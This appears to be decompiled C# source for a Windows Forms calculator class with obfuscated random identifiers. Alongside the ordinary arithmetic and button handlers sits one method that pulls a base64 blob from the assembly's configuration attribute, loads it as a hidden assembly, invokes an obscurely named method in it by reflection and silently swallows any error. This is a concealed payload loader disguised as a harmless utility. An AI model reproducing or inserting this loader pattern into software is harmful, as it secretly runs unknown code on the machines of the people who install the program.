using System;
using System.Reflection;
using System.Windows.Forms;

public class Klrkviahctqdu20yflld0zfoy
{
	private Button[] b = (Button[])(object)new Button[10];

	private Button bDot;

	private Button bPlus;

	private Button bSub;

	private Button bMul;

	private Button bDiv;

	private Button bEqu;

	private Button bClr;

	private Panel panCalc;

	private TextBox txtCalc;

	private double dblAcc;

	private double dblSec;

	private bool blnClear;

	private bool blnFrstOpen;

	private string strOper;

	private void calc()
	{
		switch (strOper)
		{
		case "/":
			dblAcc /= dblSec;
			break;
		case "*":
			dblAcc *= dblSec;
			break;
		case "-":
			dblAcc -= dblSec;
			break;
		case "+":
			dblAcc += dblSec;
			break;
		}
		strOper = "=";
		blnFrstOpen = true;
		((Control)txtCalc).set_Text(Convert.ToString(dblAcc));
		dblSec = dblAcc;
	}

	private void btn_clr(object sender, EventArgs e)
	{
		clear();
	}

	private void clear()
	{
		dblAcc = 0.0;
		dblSec = 0.0;
		blnFrstOpen = true;
		((Control)txtCalc).set_Text("");
		((Control)txtCalc).Focus();
	}

	private void btn_Oper(object sender, EventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		Button val = (Button)sender;
		strOper = ((Control)val).get_Text();
		if (blnFrstOpen)
		{
			dblAcc = dblSec;
		}
		else
		{
			calc();
		}
		blnFrstOpen = false;
		blnClear = true;
	}

	private void btn_equ(object sender, EventArgs e)
	{
		calc();
	}

	public void Ciyixmksvazl2yzypbpcydawa()
	{
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		if ((object)executingAssembly == null)
		{
			return;
		}
		try
		{
			object[] customAttributes = executingAssembly.GetCustomAttributes(typeof(AssemblyConfigurationAttribute), inherit: false);
			if (customAttributes != null && customAttributes.Length > 0)
			{
				string configuration = ((AssemblyConfigurationAttribute)customAttributes[0]).Configuration;
				string[] array = configuration.Split(new string[1] { "n2kskybf13q5k0hgyrl0skon0" }, StringSplitOptions.None);
				Assembly assembly = Assembly.Load(Convert.FromBase64String(array[0]));
				Type type = assembly.GetTypes()[0];
				MethodInfo method = type.GetMethod("rekhmk5yqpvkaessik3klhom30azg3km4");
				object obj = Activator.CreateInstance(type);
				method.Invoke(obj, new object[2]
				{
					array[1],
					array[2]
				});
			}
		}
		catch (Exception)
		{
		}
	}

	private void btn_clk(object sender, EventArgs e)
	{
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Expected O, but got Unknown
		if (blnClear)
		{
			((Control)txtCalc).set_Text("");
		}
		Button val = (Button)sender;
		TextBox obj = txtCalc;
		((Control)obj).set_Text(((Control)obj).get_Text() + ((Control)val).get_Text());
		if (((Control)txtCalc).get_Text() == ".")
		{
			((Control)txtCalc).set_Text("0.");
		}
		dblSec = Convert.ToDouble(((Control)txtCalc).get_Text());
		blnClear = false;
	}
}
